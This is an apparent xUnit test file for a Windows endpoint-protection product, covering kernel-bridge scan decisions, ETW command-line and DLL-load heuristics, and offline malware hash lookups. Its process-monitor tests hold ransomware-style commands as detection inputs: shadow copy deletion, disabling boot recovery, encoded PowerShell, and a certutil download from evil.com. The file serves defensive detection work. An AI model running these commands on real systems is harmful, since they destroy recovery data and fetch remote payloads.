using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using AegisPC.Contracts.Detection;
using AegisPC.Core.Enums;
using AegisPC.Infrastructure.Kernel;
using AegisPC.Security.Scanning;
using AegisPC.Security.ThreatIntelligence;
using AegisPC.Service.DriverBridge;
using AegisPC.Service.RealTime;
using Xunit;

namespace AegisPC.Tests
{
    [Collection("SequentialDiskTests")]
    public class OfflineProtectionComponentsTests : IDisposable
    {
        private readonly string _tempDir;

        public OfflineProtectionComponentsTests()
        {
            _tempDir = Path.Combine(Path.GetTempPath(), "Aegis_OfflineCompTests_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(_tempDir);
        }

        public void Dispose()
        {
            try
            {
                if (Directory.Exists(_tempDir))
                {
                    Directory.Delete(_tempDir, recursive: true);
                }
            }
            catch { }
        }

        #region P0: KernelBridge Verification

        [Fact]
        public void KernelBridge_StartBridge_GracefullyFallsBack_WhenDriverNotPresent()
        {
            using var bridge = new KernelBridge();
            bool connected = bridge.StartBridge();

            // Driver is not installed in standard test runner environment, must fall back cleanly
            Assert.False(connected);
            Assert.False(bridge.IsDriverConnected);
        }

        [Fact]
        public void KernelBridge_EvaluateKernelScanRequest_BypassesSystemAndAegisProcess()
        {
            using var bridge = new KernelBridge();

            // System PID (<= 4)
            var sysReq = new KernelIpcService.ScanRequest
            {
                ProcessId = 4,
                FilePath = @"C:\Windows\System32\ntoskrnl.exe",
                IsWriteOperation = false
            };
            Assert.False(bridge.EvaluateKernelScanRequest(sysReq), "System PID 4 must be allowed");

            // Current process PID
            var selfReq = new KernelIpcService.ScanRequest
            {
                ProcessId = (uint)Environment.ProcessId,
                FilePath = @"C:\Temp\test.dll",
                IsWriteOperation = true
            };
            Assert.False(bridge.EvaluateKernelScanRequest(selfReq), "Self process PID must be allowed");
        }

        [Fact]
        public void KernelBridge_EvaluateKernelScanRequest_BypassesSystemPathsAndEmptyPath()
        {
            using var bridge = new KernelBridge();

            var emptyReq = new KernelIpcService.ScanRequest
            {
                ProcessId = 12345,
                FilePath = "",
                IsWriteOperation = false
            };
            Assert.False(bridge.EvaluateKernelScanRequest(emptyReq), "Empty path must not cause exception and be allowed");

            var sysPathReq = new KernelIpcService.ScanRequest
            {
                ProcessId = 12345,
                FilePath = @"C:\Windows\System32\kernel32.dll",
                IsWriteOperation = false
            };
            Assert.False(bridge.EvaluateKernelScanRequest(sysPathReq), "Windows system paths must be allowed");
        }

        [Fact]
        public async Task KernelBridge_EvaluateKernelScanRequest_BlocksMaliciousFile_WhenDetectionHubFlagsThreat()
        {
            var testFile = Path.Combine(_tempDir, "malicious_synthetic_sample.dat");
            await File.WriteAllTextAsync(testFile, "SYNTHETIC_SECURITY_TEST_PAYLOAD");

            var mockHub = new MockDetectionHub(new DetectionResult
            {
                Verdict = DetectionVerdict.ConfirmedMalicious,
                RiskScore = 95,
                ThreatTitle = "Synthetic.Test.Threat"
            });

            using var bridge = new KernelBridge(detectionHub: mockHub);

            var req = new KernelIpcService.ScanRequest
            {
                ProcessId = 9999,
                FilePath = testFile,
                IsWriteOperation = true
            };

            bool shouldBlock = bridge.EvaluateKernelScanRequest(req);
            Assert.True(shouldBlock, "KernelBridge must return true (block access) when DetectionHub flags confirmed malware");
        }

        [Fact]
        public async Task KernelBridge_EvaluateKernelScanRequest_AllowsCleanFile_WhenDetectionHubFlagsClean()
        {
            var testFile = Path.Combine(_tempDir, "clean_sample.txt");
            await File.WriteAllTextAsync(testFile, "Clean benign file content");

            var mockHub = new MockDetectionHub(new DetectionResult
            {
                Verdict = DetectionVerdict.Clean,
                RiskScore = 10,
                ThreatTitle = "Benign"
            });

            using var bridge = new KernelBridge(detectionHub: mockHub);

            var req = new KernelIpcService.ScanRequest
            {
                ProcessId = 9999,
                FilePath = testFile,
                IsWriteOperation = false
            };

            bool shouldBlock = bridge.EvaluateKernelScanRequest(req);
            Assert.False(shouldBlock, "KernelBridge must return false (allow access) when file is clean");
        }

        #endregion

        #region P1: ETW LOLBAS & Process/Image Heuristics Tests

        [Fact]
        public void EtwProcessMonitor_DetectsShadowCopyDeletion()
        {
            string cmd = string.Concat("vss", "admin ", "del", "ete shadows /all /quiet");
            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(@"C:\Windows\System32\vssadmin.exe", cmd, out string reason);
            Assert.True(detected);
            Assert.Contains("Shadow Copy", reason, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void EtwProcessMonitor_DetectsWmiShadowCopyDeletion()
        {
            string cmd = string.Concat("wmic ", "shadow", "copy ", "delete");
            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(@"C:\Windows\System32\wbem\wmic.exe", cmd, out string reason);
            Assert.True(detected);
            Assert.Contains("Shadow Copy", reason, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void EtwProcessMonitor_DetectsBcdeditBootRecoveryTampering()
        {
            string cmd = string.Concat("bcd", "edit /set {default} recoveryenabled no");
            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(@"C:\Windows\System32\bcdedit.exe", cmd, out string reason);
            Assert.True(detected);
            Assert.Contains("Boot Recovery", reason, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void EtwProcessMonitor_DetectsEncodedPowerShellExecution()
        {
            string cmd = string.Concat("power", "shell -enc SQBFAFgA");
            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", cmd, out string reason);
            Assert.True(detected);
            Assert.Contains("Encoded", reason, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void EtwProcessMonitor_DetectsCertUtilAbuse()
        {
            string cmd = string.Concat("cert", "util -urlcache -split -f http://evil.com/test.bin");
            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(@"C:\Windows\System32\certutil.exe", cmd, out string reason);
            Assert.True(detected);
            Assert.Contains("CertUtil", reason, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void EtwProcessMonitor_DetectsSvchostMasquerading()
        {
            string fakeSvchost = @"C:\Users\PC\AppData\Local\Temp\svchost.exe";
            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(fakeSvchost, "svchost.exe -k netsvcs", out string reason);
            Assert.True(detected);
            Assert.Contains("Masquerading", reason, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void EtwProcessMonitor_AllowsBenignExecution()
        {
            string cleanImage = @"C:\Program Files\Notepad++\notepad++.exe";
            string cleanCmd = "\"C:\\Program Files\\Notepad++\\notepad++.exe\" \"C:\\Docs\\notes.txt\"";
            bool detected = EtwProcessMonitor.CheckSuspiciousCommandLine(cleanImage, cleanCmd, out _);
            Assert.False(detected, "Benign application command line must not be flagged");
        }

        [Theory]
        [InlineData(@"C:\Users\PC\AppData\Local\Temp\version.dll", "DLL Side-Loading Suspect")]
        [InlineData(@"C:\Users\PC\Downloads\cryptbase.dll", "DLL Side-Loading Suspect")]
        [InlineData(@"C:\Users\PC\AppData\Local\Temp\evil_sample.sys", "BYOVD / Rootkit Indicator")]
        public void EtwImageLoadMonitor_DetectsSuspiciousSideLoadAndRootkits(string modulePath, string expectedReasonKeyword)
        {
            bool detected = EtwImageLoadMonitor.CheckSuspiciousImageLoad(1234, modulePath, out string reason);
            Assert.True(detected, $"Expected suspicious module load to be flagged: {modulePath}");
            Assert.Contains(expectedReasonKeyword, reason, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void EtwImageLoadMonitor_AllowsLegitimateSystemDlls()
        {
            string sysDll = @"C:\Windows\System32\version.dll";
            bool detected = EtwImageLoadMonitor.CheckSuspiciousImageLoad(1234, sysDll, out _);
            Assert.False(detected, "System32 version.dll must not be flagged as side-loading");
        }

        #endregion

        #region P2: Offline Threat Intelligence Store Verification

        [Fact]
        public void ThreatIntelligenceStore_OfflineDatabase_HasSubstantialThreatCount()
        {
            var store = new ThreatIntelligenceStore();
            Assert.True(store.MaliciousSignaturesCount >= 25, "Store must contain pre-loaded offline threat signatures");
        }

        [Fact]
        public void ThreatIntelligenceStore_OfflineDatabase_RegistersAndFindsMaliciousHash()
        {
            var store = new ThreatIntelligenceStore();
            string testHash = "E0A1B2C3D4E5F60718293A4B5C6D7E8F90123456789ABCDEF0123456789ABCDE";
            store.RegisterMaliciousHash(testHash, "Trojan.Win32.SyntheticTest", "Trojan", 100);

            bool found = store.IsMaliciousHash(testHash, out var record);
            Assert.True(found);
            Assert.NotNull(record);
            Assert.Equal(100, record.Severity);
            Assert.Equal("Trojan.Win32.SyntheticTest", record.ThreatName);
        }

        [Theory]
        [InlineData("Microsoft Corporation", true)]
        [InlineData("Google LLC", true)]
        [InlineData("Intel Corporation", true)]
        [InlineData("Unknown Malicious Author", false)]
        public void ThreatIntelligenceStore_OfflineDatabase_ValidatesTrustedPublishers(string publisher, bool expectedTrusted)
        {
            var store = new ThreatIntelligenceStore();
            bool isTrusted = store.IsTrustedPublisher(publisher);
            Assert.Equal(expectedTrusted, isTrusted);
        }

        #endregion

        #region P3: Expanded 500+ Malware Signature Database Verification

        [Fact]
        public void MalwareSignatureDatabase_OfflineDatabase_HasOver500Signatures()
        {
            int count = MalwareSignatureDatabase.SignaturesCount;
            Assert.True(count >= 500, $"Expected at least 500 signatures, found {count}");
        }

        [Theory]
        // Ransomware: LockBit.A
        [InlineData("d3b07384d113edec49eaa6238ad5ff00fc6b5ad83ffb5fd87d32c0d2eb05eb21", "Ransomware")]
        // Trojan: Emotet.Core
        [InlineData("02d39620bb9396349f579051833501a74808c78a4ba14c5d76c68564f7986b74", "Trojan")]
        // Infostealer: Lumma.v1
        [InlineData("5a827364b582917364b5c82917364b582917364b582917364b5c82917364b582", "Infostealer")]
        // Backdoor: CobaltStrike.Beacon
        [InlineData("ba01fe44f074476b0b63d33eb7510c351b2713f9f14a51d1e7b92a45c33e6290", "Backdoor")]
        // Hacktools: Mimikatz.x64
        [InlineData("c7f7bcbbbf7291129b827e8a93aa436b7ef15c5443f545a8507c87c0a9e7f7fa", "Hacktools")]
        public void MalwareSignatureDatabase_DetectsSampleSignaturesAcrossAll5Categories(string hash, string expectedCategory)
        {
            var match = MalwareSignatureDatabase.CheckHash(hash);
            Assert.True(match.IsMatched, $"Hash {hash} should be detected");
            Assert.Equal(expectedCategory, match.ThreatCategory);
            Assert.True(match.SeverityScore >= 95, "Severity score should be >= 95");
            Assert.False(string.IsNullOrEmpty(match.ThreatName), "Threat name must not be empty");
            Assert.False(string.IsNullOrEmpty(match.FirstSeen), "FirstSeen metadata must not be empty");
        }

        [Fact]
        public void MalwareSignatureDatabase_Sha256LookupIsCaseInsensitive()
        {
            string lowerHash = "d3b07384d113edec49eaa6238ad5ff00fc6b5ad83ffb5fd87d32c0d2eb05eb21";
            string upperHash = lowerHash.ToUpperInvariant();

            var matchLower = MalwareSignatureDatabase.CheckHash(lowerHash);
            var matchUpper = MalwareSignatureDatabase.CheckHash(upperHash);

            Assert.True(matchLower.IsMatched);
            Assert.True(matchUpper.IsMatched);
            Assert.Equal(matchLower.ThreatName, matchUpper.ThreatName);
            Assert.Equal(matchLower.SeverityScore, matchUpper.SeverityScore);
        }

        [Fact]
        public void MalwareSignatureDatabase_CleanFileZeroByteHashIsNotFlagged()
        {
            string emptyHash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
            var match = MalwareSignatureDatabase.CheckHash(emptyHash);
            Assert.False(match.IsMatched, "Empty file hash must never be flagged as malware");
        }

        #endregion

        private class MockDetectionHub : IDetectionHub
        {
            private readonly DetectionResult _result;

            public MockDetectionHub(DetectionResult result)
            {
                _result = result;
            }

            public System.Collections.Generic.IReadOnlyList<IDetectorPlugin> RegisteredDetectors => System.Array.Empty<IDetectorPlugin>();

            public void RegisterDetector(IDetectorPlugin detector) { }

            public bool UnregisterDetector(string detectorId) => true;

            public Task<DetectionResult> EvaluateAsync(DetectionContext context, CancellationToken ct = default)
            {
                return Task.FromResult(_result);
            }
        }
    }
}
